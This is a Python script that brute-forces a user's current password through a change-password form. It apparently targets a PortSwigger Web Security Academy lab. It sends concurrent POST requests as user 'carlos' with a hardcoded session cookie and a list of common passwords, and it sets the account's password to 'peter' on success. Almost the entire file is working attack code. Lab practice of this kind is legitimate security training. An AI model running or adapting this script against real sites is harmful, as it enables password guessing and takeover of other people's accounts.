import asyncio
import aiohttp
import nest_asyncio
import time

nest_asyncio.apply()

# Target configuration
BASE_URL = "https://0a2d00dd03fb07c68221e23f008200b2.web-security-academy.net"
CHANGE_PASSWORD_URL = f"{BASE_URL}/my-account/change-password"

# Session cookie from your request
COOKIES = {
    "session": "f4ARjCxWax77jVMhMYLrqcno3Bj90tTc"
}

# Headers from your request
HEADERS = {
    "Host": "0a2d00dd03fb07c68221e23f008200b2.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "en-US,en;q=0.9",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": BASE_URL,
    "Referer": f"{BASE_URL}/my-account?id=carlos",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Upgrade-Insecure-Requests": "1"
}

# Password list from your input
PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", 
    "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", 
    "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", 
    "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", 
    "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", 
    "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", 
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", 
    "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", 
    "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", 
    "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", 
    "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", 
    "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", 
    "monitoring", "montana", "moon", "moscow"
]

CONCURRENT_REQUESTS = 10
found_password = None

async def try_password(session, password):
    global found_password
    if found_password:
        return
    
    data = {
        "username": "carlos",
        "current-password": password,
        "new-password-1": "peter",
        "new-password-2": "peter"
    }
    
    try:
        async with session.post(CHANGE_PASSWORD_URL, headers=HEADERS, cookies=COOKIES, data=data) as resp:
            text = await resp.text()
            
            if "Password changed successfully!" in text:
                found_password = password
                return
                
    except Exception as e:
        pass  # Silently continue

async def worker(session, passwords):
    for password in passwords:
        if found_password:
            break
        await try_password(session, password)

async def main():
    connector = aiohttp.TCPConnector(limit=CONCURRENT_REQUESTS, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        chunks = [PASSWORDS[i::CONCURRENT_REQUESTS] for i in range(CONCURRENT_REQUESTS)]
        print("starting...")
        tasks = [worker(session, chunk) for chunk in chunks]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    start = time.time()
    asyncio.run(main())
    
    if found_password:
        print(f"\n[+] Found password: {found_password}")
    else:
        print("\n[-] Password not found")
    
    print(f"Time: {time.time() - start:.2f} seconds")